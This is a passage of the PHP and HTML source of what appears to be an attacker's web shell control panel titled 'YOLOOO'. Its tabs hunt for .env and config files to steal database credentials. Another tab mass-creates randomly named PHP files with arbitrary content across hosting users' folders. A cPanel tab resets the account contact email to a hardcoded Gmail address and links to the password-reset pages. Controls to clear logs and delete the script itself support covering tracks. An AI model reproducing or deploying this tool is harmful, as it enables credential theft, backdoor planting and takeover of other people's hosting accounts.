            border-radius: 4px;
        }
        .copy-btn {
            margin-top: 4px;
            padding: 2px 8px;
            cursor: pointer;
            border: none;
            border-radius: 4px;
            background: #1a73e8;
            color: #fff;
            font-size: 0.95em;
            transition: background 0.15s;
        }
        .copy-btn:hover {
            background: #1558b0;
        }
        .copied-msg {
            display: none;
            color: #4ade80;
            margin-left: 8px;
            font-weight: bold;
        }
        .checkbox-group {
            margin-bottom: 14px;
            background: #23272b;
            border-radius: 6px;
            padding: 12px 14px 8px 14px;
        }
        .checkbox-group label {
            display: flex;
            align-items: center;
            font-weight: 400;
            margin-bottom: 6px;
            font-size: 14px;
            color: #e0e0e0;
        }
        .btn-group {
            margin-bottom: 8px;
            display: flex;
            gap: 6px;
        }
        .btn-group button {
            background: #23272b;
            color: #b0b8c1;
            font-size: 13px;
            padding: 5px 14px;
            border-radius: 4px;
            border: 1px solid #333;
            font-weight: 500;
            transition: background .15s, color .15s;
        }
        .btn-group button:hover {
            background: #1a73e8;
            color: #fff;
        }
        pre {
            background: #181c20;
            padding: 8px 10px;
            border-radius: 5px;
            overflow-x: auto;
            font-size: 14px;
            margin: 6px 0 0 0;
            color: #e0e0e0;
        }
        ul { margin: 0 0 0 16px; }
        label {
            margin-top: 8px;
            display: block;
            font-weight: 500;
            color: #b0b8c1;
        }
        input[type="text"], input[type="email"], textarea, select {
            width: 100%;
            max-width: 400px;
            padding: 7px 10px;
            border: 1px solid #333;
            border-radius: 4px;
            background: #23272b;
            color: #e0e0e0;
            margin-bottom: 8px;
            font-size: 1em;
        }
        input[type="text"]:focus, input[type="email"]:focus, textarea:focus, select:focus {
            border: 1.5px solid #1a73e8;
            outline: none;
        }
        .btn-row {
            margin: 12px 0;
            display: flex;
            gap: 10px;
        }
        button, input[type="submit"] {
            background: #1a73e8;
            color: #fff;
            font-weight: 500;
            border: none;
            border-radius: 4px;
            padding: 8px 20px;
            font-size: 1em;
            cursor: pointer;
            transition: background 0.15s;
        }
        button:hover, input[type="submit"]:hover {
            background: #1558b0;
        }
        .delete-btn, .delete-btn-global {
            background: #e84545;
            color: #fff;
            font-weight: bold;
            border: none;
            border-radius: 5px;
            padding: 10px 24px;
            margin-top: 10px;
            transition: background 0.15s;
        }
        .delete-btn:hover, .delete-btn-global:hover {
            background: #a82323;
        }
        .delete-btn-global {
            display: block;
            margin: 24px auto 0 auto;
            font-size: 1.1em;
            box-shadow: 0 1px 4px #0004;
        }
        .cpanel-contact-form {
            max-width: 350px;
            margin: 0 auto;
            background: #181c20;
            border-radius: 8px;
            box-shadow: 0 1px 4px #0004;
            padding: 20px 16px 12px 16px;
            text-align: center;
        }
        .cpanel-contact-form input[type="email"] {
            width: 90%;
            margin-bottom: 10px;
        }
        .cpanel-contact-form input[type="submit"] {
            background: #4ade80;
            color: #181c20;
            font-weight: bold;
            border: none;
            border-radius: 4px;
            padding: 8px 24px;
            font-size: 1em;
            margin-top: 6px;
        }
        .cpanel-contact-form input[type="submit"]:hover {
            background: #22c55e;
            color: #fff;
        }
        .nav {
            margin: 1.2em 0 0.5em 0;
            padding: 0;
            list-style: none;
        }
        .nav li {
            display: inline-block;
            margin: 0 6px;
        }
        .nav a {
            color: #fff;
            background: #1a73e8;
            padding: 6px 14px;
            border-radius: 4px;
            text-decoration: none;
            font-family: 'Segoe UI', Arial, sans-serif;
            font-size: 0.98em;
            transition: background 0.15s, color 0.15s;
        }
        .nav a:hover {
            background: #e84545;
            color: #fff;
        }
        .ip-note {
            margin-top:1.2em;
            color:#b0b8c1;
            font-size:0.95em;
        }
    </style>
    <script>
    function showTab(tab) {
        document.getElementById('tab_scanonly').classList.remove('active');
        document.getElementById('tab_db').classList.remove('active');
        document.getElementById('tab_mass').classList.remove('active');
        document.getElementById('tab_cpanel').classList.remove('active');
        document.getElementById('content_scanonly').classList.remove('active');
        document.getElementById('content_db').classList.remove('active');
        document.getElementById('content_mass').classList.remove('active');
        document.getElementById('content_cpanel').classList.remove('active');
        document.getElementById('tab_' + tab).classList.add('active');
        document.getElementById('content_' + tab).classList.add('active');
        window.location.hash = (tab === 'db') ? '#db' : (tab === 'mass' ? '#mass' : (tab === 'cpanel' ? '#cpanel' : ''));
    }
    function copyFromTextarea(id, btn) {
        const el = document.getElementById(id);
        el.select();
        document.execCommand("copy");
        const msg = btn.nextElementSibling;
        msg.style.display = 'inline';
        setTimeout(() => msg.style.display = 'none', 1200);
    }
    function checkAll() {
        document.querySelectorAll('input[type="checkbox"][name="folders[]"]').forEach(e => e.checked = true);
    }
    function uncheckAll() {
        document.querySelectorAll('input[type="checkbox"][name="folders[]"]').forEach(e => e.checked = false);
    }
    function keepCheckedFolders() { return true; }
    window.onload = function() {
        if (window.location.hash === "#db") showTab('db');
        else if (window.location.hash === "#mass") showTab('mass');
        else if (window.location.hash === "#cpanel") showTab('cpanel');
        else showTab('scanonly');
    }
    </script>
</head>
<body>
<div class="main-wrap">
    <div class="header">YOLOOO</div>
    <div class="tab-bar">
        <button id="tab_scanonly" class="tab-btn active" onclick="showTab('scanonly')">File Scan Only</button>
        <button id="tab_db" class="tab-btn" onclick="showTab('db')">DB Dump (Auto/Manual)</button>
        <button id="tab_mass" class="tab-btn" onclick="showTab('mass')">Mass File Creator</button>
        <button id="tab_cpanel" class="tab-btn" onclick="showTab('cpanel')">cPanel Contact Reset</button>
    </div>
    <!-- Tab: File Scan Only -->
    <div id="content_scanonly" class="tab-content active">
        <form method="get" class="form-row" style="margin-bottom:15px;">
            <label>Directory:
                <input type="text" name="scanonly_dir" value="<?php echo htmlspecialchars($scan_only_dir); ?>" style="max-width:350px;display:inline-block;">
            </label>
            <button type="submit" class="tab-btn" style="padding:7px 18px;margin-left:8px;">Scan</button>
        </form>
        <div class="file-list">
<?php
// File scan only output
$id = 0;
$rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($scan_only_dir, FilesystemIterator::SKIP_DOTS));
foreach ($rii as $file) {
    if ($file->isDir()) continue;
    $filename = $file->getFilename();
    if (in_array($filename, $target_files)) {
        $path = $file->getPathname();
        $url = htmlspecialchars($_SERVER['PHP_SELF']) . '?view=' . urlencode($path);

        echo '<div class="file-found">[FOUND] <a class="file-link" href="' . $url . '">' . htmlspecialchars($path) . '</a>';

        if ($filename === '.env') {
            $cmd = "cp '" . addslashes($path) . "' a";
            $textareaId = 'cmd_' . $id++;
            echo '<br><textarea id="' . $textareaId . '" class="cmd-box" readonly>' . htmlspecialchars($cmd) . '</textarea>';
            echo '<button class="copy-btn" onclick="copyFromTextarea(\'' . $textareaId . '\', this)">📋 Copy</button>';
            echo '<span class="copied-msg">Copied!</span>';
        }
        echo "</div>";
    }
}
?>
        </div>
    </div>
    <!-- Tab: DB Dump (Auto/Manual) -->
    <div id="content_db" class="tab-content">
        <div class="form-row" style="margin-bottom:10px;">
            <b>Current Path:</b> <span style="color:#4ade80;"><?php echo htmlspecialchars($scan_dir); ?></span>
        </div>
        <form method="POST" class="form-row" style="margin-bottom:10px;">
            <label>Scan Directory:</label>
            <input type="text" name="scan_dir" value="<?php echo htmlspecialchars($scan_dir); ?>" required>
            <button type="submit" name="action" value="auto" class="tab-btn" style="padding:7px 18px;">Auto Scan</button>
        </form>
        <form method="POST" class="form-row" style="margin-bottom:10px;">
            <label>Paste config content manual:</label>
            <textarea name="manual_text" rows="7" placeholder="Paste config text here..." required></textarea>
            <button type="submit" name="action" value="manual" class="tab-btn" style="padding:7px 18px;">Manual Scan</button>
        </form>
        <form method="POST" class="form-row" onsubmit="return confirm('Delete all result files and this script?');" style="margin-bottom:10px;">
            <button type="submit" name="action" value="delete_all" class="delete-btn">Delete All Results</button>
        </form>
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            if ($_POST['action'] == 'auto') {
                auto_mode($scan_dir, $target_files);
            } elseif ($_POST['action'] == 'manual') {
                manual_mode(trim($_POST['manual_text']));
            } elseif ($_POST['action'] == 'delete_all') {
                delete_files_only();
                exit;
            }
        }
        ?>
    </div>
    <!-- Tab: Mass File Creator -->
    <div id="content_mass" class="tab-content">
        <form method="post" novalidate class="form-section" id="massForm" autocomplete="off">
            <?php if ($errors): ?>
                <div class="alert error">
                    <ul>
                        <?php foreach ($errors as $e): ?><li><?= htmlspecialchars($e) ?></li><?php endforeach; ?>
                    </ul>
                </div>
            <?php endif; ?>
            <?php if ($results): ?>
                <div class="alert success">
                    <ul>
                        <?php foreach ($results as $r): ?><li><?= htmlspecialchars($r) ?></li><?php endforeach; ?>
                    </ul>
                </div>
            <?php endif; ?>
            <?php
            // Show the copy box for all created file URLs after creation
            if (!empty($massFileCopyBox)) {
                echo $massFileCopyBox;
            }
            ?>
            <?php if ($currentDirList): ?>
                <div class="alert info">
                    <b>Current Directory (<?= htmlspecialchars(getcwd()) ?>):</b>
                    <ul>
                        <?php foreach ($currentDirList as $item): ?>
                            <li><?= htmlspecialchars($item) ?></li>
                        <?php endforeach; ?>
                    </ul>
                </div>
            <?php endif; ?>
            <?php if ($recentFileContents): ?>
                <div class="alert info">
                    <b>Recent File(s) Content:</b>
                    <ul>
                        <?php foreach ($recentFileContents as $rf): ?>
                            <li>
                                <b><?= htmlspecialchars($rf['path']) ?></b>
                                <pre><?= htmlspecialchars($rf['content']) ?></pre>
                            </li>
                        <?php endforeach; ?>
                    </ul>
                </div>
            <?php endif; ?>

            <label for="basepath">Base Path:</label>
            <input type="text" id="basepath" name="basepath" placeholder="/home/username" value="<?= htmlspecialchars($basePath) ?>" required>

            <label for="fixedfolder">Fixed Folder <span style="font-weight:400;color:#6b7280;">(optional)</span>:</label>
            <input type="text" id="fixedfolder" name="fixedfolder" placeholder="public_html" value="<?= htmlspecialchars($fixedFolder) ?>">

            <label for="ignorefolders">Ignore Folders <span style="font-weight:400;color:#6b7280;">(comma separated)</span>:</label>
            <input type="text" id="ignorefolders" name="ignorefolders" placeholder=".cagefs,.cpanel" value="<?= htmlspecialchars(isset($_POST['ignorefolders']) ? $_POST['ignorefolders'] : implode(',', $ignoreFoldersDefault)) ?>">

            <div class="btn-row">
                <button type="submit" name="scan" value="1">Check Path</button>
                <button type="submit" name="readcurrent" value="1" class="btn-group">Read Current Dir</button>
                <button type="submit" name="read_recent" value="1" class="btn-group">Read Recent File</button>
            </div>

            <div style="margin-bottom:18px;">
                <label style="display:inline-block;margin-right:18px;">
                    <input type="radio" name="deepscan" value="0" <?= !in_array($deepScan, ['2', '2one', '3']) ? 'checked' : '' ?>> Normal (1-level)
                </label>
                <label style="display:inline-block;margin-right:18px;">
                    <input type="radio" name="deepscan" value="2" <?= $deepScan === '2' ? 'checked' : '' ?>> Deep Scan 2-level (a/b)
                </label>
                <label style="display:inline-block;margin-right:18px;">
                    <input type="radio" name="deepscan" value="2one" <?= $deepScan === '2one' ? 'checked' : '' ?>> Deep Scan 2-level (1 per parent, skip cgi-bin/.well-known)
                </label>
                <label style="display:inline-block;">
                    <input type="radio" name="deepscan" value="3" <?= $deepScan === '3' ? 'checked' : '' ?>> Deep Scan 3-level (a/b/c)
                </label>
            </div>

            <?php
            // Helper for extension select
            function ext_select($selected = 'php') {
                $exts = ['php'=>'php','txt'=>'txt','html'=>'html'];
                $out = '<select id="extension" name="extension" required>';
                foreach ($exts as $k=>$v) {
                    $sel = ($selected == $k) ? 'selected' : '';
                    $out .= "<option value=\"$k\" $sel>.$v</option>";
                }
                $out .= '</select>';
                return $out;
            }
            $selected_ext = isset($_POST['extension']) && in_array($_POST['extension'], ['php','txt','html']) ? $_POST['extension'] : 'php';
            ?>

            <?php if ($deepScan === '2' && $deepFolders2): ?>
                <div class="checkbox-group">
                    <label style="font-weight:600;margin-bottom:10px;">Select subfolders (a/b):</label>
                    <div class="btn-group">
                        <button type="button" class="btn-group" onclick="checkAll()">Select All</button>
                        <button type="button" class="btn-group" onclick="uncheckAll()">Deselect All</button>
                    </div>
                    <?php foreach ($deepFolders2 as $f): ?>
                        <label><input type="checkbox" name="folders[]" value="<?= htmlspecialchars($f) ?>" <?= in_array($f, $checkedFolders) ? 'checked' : '' ?>><?= htmlspecialchars($f) ?></label>
                    <?php endforeach; ?>
                </div>
                <label for="extension">File Extension:</label>
                <?= ext_select($selected_ext) ?>
                <label for="content">File Content:</label>
                <textarea id="content" name="content" rows="6" required><?= isset($_POST['content']) ? htmlspecialchars($_POST['content']) : '' ?></textarea>
                <div class="btn-row">
                    <button type="submit" name="create" value="1" onclick="return keepCheckedFolders()">Create Files</button>
                    <button type="submit" name="delete_recent" value="1" class="btn-group">Delete Recent Files</button>
                </div>
            <?php elseif ($deepScan === '2one' && $deepFolders2_one): ?>
                <div class="checkbox-group">
                    <label style="font-weight:600;margin-bottom:10px;">Select subfolders (a/b, 1 per parent, skip cgi-bin/.well-known):</label>
                    <div class="btn-group">
                        <button type="button" class="btn-group" onclick="checkAll()">Select All</button>
                        <button type="button" class="btn-group" onclick="uncheckAll()">Deselect All</button>
                    </div>
                    <?php foreach ($deepFolders2_one as $f): ?>
                        <label><input type="checkbox" name="folders[]" value="<?= htmlspecialchars($f) ?>" <?= in_array($f, $checkedFolders) ? 'checked' : '' ?>><?= htmlspecialchars($f) ?></label>
                    <?php endforeach; ?>
                </div>
                <label for="extension">File Extension:</label>
                <?= ext_select($selected_ext) ?>
                <label for="content">File Content:</label>
                <textarea id="content" name="content" rows="6" required><?= isset($_POST['content']) ? htmlspecialchars($_POST['content']) : '' ?></textarea>
                <div class="btn-row">
                    <button type="submit" name="create" value="1" onclick="return keepCheckedFolders()">Create Files</button>
                    <button type="submit" name="delete_recent" value="1" class="btn-group">Delete Recent Files</button>
                </div>
            <?php elseif ($deepScan === '3' && $deepFolders3): ?>
                <div class="checkbox-group">
                    <label style="font-weight:600;margin-bottom:10px;">Select subfolders (a/b/c):</label>
                    <div class="btn-group">
                        <button type="button" class="btn-group" onclick="checkAll()">Select All</button>
                        <button type="button" class="btn-group" onclick="uncheckAll()">Deselect All</button>
                    </div>
                    <?php foreach ($deepFolders3 as $f): ?>
                        <label><input type="checkbox" name="folders[]" value="<?= htmlspecialchars($f) ?>" <?= in_array($f, $checkedFolders) ? 'checked' : '' ?>><?= htmlspecialchars($f) ?></label>
                    <?php endforeach; ?>
                </div>
                <label for="extension">File Extension:</label>
                <?= ext_select($selected_ext) ?>
                <label for="content">File Content:</label>
                <textarea id="content" name="content" rows="6" required><?= isset($_POST['content']) ? htmlspecialchars($_POST['content']) : '' ?></textarea>
                <div class="btn-row">
                    <button type="submit" name="create" value="1" onclick="return keepCheckedFolders()">Create Files</button>
                    <button type="submit" name="delete_recent" value="1" class="btn-group">Delete Recent Files</button>
                </div>
            <?php elseif (!in_array($deepScan, ['2', '2one', '3']) && $folders): ?>
                <div class="checkbox-group">
                    <label style="font-weight:600;margin-bottom:10px;">Select folders:</label>
                    <div class="btn-group">
                        <button type="button" class="btn-group" onclick="checkAll()">Select All</button>
                        <button type="button" class="btn-group" onclick="uncheckAll()">Deselect All</button>
                    </div>
                    <?php foreach ($folders as $f): ?>
                        <label><input type="checkbox" name="folders[]" value="<?= htmlspecialchars($f) ?>" <?= in_array($f, $checkedFolders) ? 'checked' : '' ?>><?= htmlspecialchars($f) ?></label>
                    <?php endforeach; ?>
                </div>
                <label for="extension">File Extension:</label>
                <?= ext_select($selected_ext) ?>
                <label for="content">File Content:</label>
                <textarea id="content" name="content" rows="6" required><?= isset($_POST['content']) ? htmlspecialchars($_POST['content']) : '' ?></textarea>
                <div class="btn-row">
                    <button type="submit" name="create" value="1" onclick="return keepCheckedFolders()">Create Files</button>
                    <button type="submit" name="delete_recent" value="1" class="btn-group">Delete Recent Files</button>
                </div>
            <?php else: ?>
                <div class="btn-row">
                    <button type="submit" name="delete_recent" value="1" class="btn-group">Delete Recent Files</button>
                    <button type="submit" name="read_recent" value="1" class="btn-group">Read Recent File</button>
                </div>
            <?php endif; ?>
            <div style="margin-top:10px;color:#aaa;font-size:0.97em;">
                <b>Note:</b> Each file will be created with a random 5-letter name (a-z) and the selected extension.
            </div>
        </form>
    </div>
    <!-- Tab: cPanel Contact Reset -->
    <div id="content_cpanel" class="tab-content">
        <div class="cpanel-contact-form">
            <h2 style="margin-bottom:0.5em;">cPanel Contact Reset</h2>
            <?php echo $msg; ?>
            <form action="#" method="post" autocomplete="off">
                <input type="email" name="email" required placeholder="Enter contact email" value="saniusmira@gmail.com" />
                <br>
                <input type="submit" name="submit" value="Send" />
            </form>
            <ul class="nav">
                <li><a href="http://<?= $site ?>:2082/resetpass?start=1" target="_blank">check reset http</a></li>
            </ul>
            <ul class="nav">
                <li><a href="https://<?= $site ?>:2083/resetpass?start=1" target="_blank">check reset https</a></li>
            </ul>
            <ul class="nav">
                <li><a href="?self=destroy">clear log</a></li>
            </ul>
            <div class="ip-note">Your IP: <?php echo htmlspecialchars($ips); ?></div>
        </div>
    </div>
    <!-- Global Delete Script Button -->
    <form method="POST" onsubmit="return confirm('Are you sure you want to delete this script file?');">
        <button type="submit" name="delete_script_global" class="delete-btn-global">Delete Script</button>
    </form>
</div>
</body>
</html>
